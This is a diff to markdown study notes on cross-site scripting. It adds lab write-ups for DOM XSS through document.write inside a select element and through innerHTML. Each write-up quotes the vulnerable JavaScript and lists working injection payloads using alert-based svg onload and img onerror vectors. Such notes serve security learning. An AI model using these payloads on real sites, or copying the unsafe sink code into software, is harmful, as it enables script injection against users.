@@ -348,9 +348,9 @@ It allows an attacker to circumvent the same origin policy.
 
 ### Types
 
-- Reflected
-- Stored
-- DOM-based
+- [Reflected](#reflected-xss)
+- [Stored](#stored-xss)
+- [DOM-based](#dom-xss)
 
 ### Reflected XSS
 
@@ -414,7 +414,7 @@ How to:
 
 Comment ```<img src=x onerror=alert(1)>```
 
-## DOM-based
+## DOM XSS
 
 Includes unsafe data into the DOM.
 
@@ -463,6 +463,75 @@ Using this payload ```x"><script>alert(1)</script><img src="x``` the document.wr
 
 Intended solution ```"><svg onload=alert(1)>```
 
------
+----
+
+#### [Lab]: DOM XSS in document.write sink using source location.search inside a select element
+
+Relevant code
+
+```
+var stores = ["London","Paris","Milan"];
+var store = (new URLSearchParams(window.location.search)).get('storeId');
+document.write('<select name="storeId">');
+if(store) {
+    document.write('<option selected>'+store+'</option>');
+}
+for(var i=0;i<stores.length;i++) {
+    if(stores[i] === store) {
+        continue;
+    }
+    document.write('<option>'+stores[i]+'</option>');
+}
+document.write('</select>');
+```
+
+- We see that ```storeId``` is acting as a sink.
+- As soon as we add it to the query, we get it as an option in select.
+- We will have to close option and select tags and then inject our alert payload.
+
+```
+<select name="storeId">
+	<option>London</option>
+	<option>Paris</option>
+	<option>Milan</option>
+</select>
+```
+
+Working payload ```</option></select><svg onload=alert(1)>```
+
+Intended solution ```"></select><img src=1 onerror=alert(1)>```
+
+----
+
+- The innerHTML sink doesn't accept script elements on any modern browser, nor will svg onload events fire.
+- This means you will need to use alternative elements like img or iframe.
+
+```element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'```
+
+#### [Lab]: DOM XSS in innerHTML sink using source location.search
+
+Relevant code
+
+```
+function doSearchQuery(query) {
+    document.getElementById('searchMessage').innerHTML = query;
+}
+var query = (new URLSearchParams(window.location.search)).get('search');
+if(query) {
+    doSearchQuery(query);
+}
+```
+
+Doesn't work ```</span><script>alert(1)</script><span>``` (due to innerHTML restrictions above)
+
+Does work ```<img src=1 onerror=alert(1)>```
+
+----
+
+
+
+
+
+
 
 
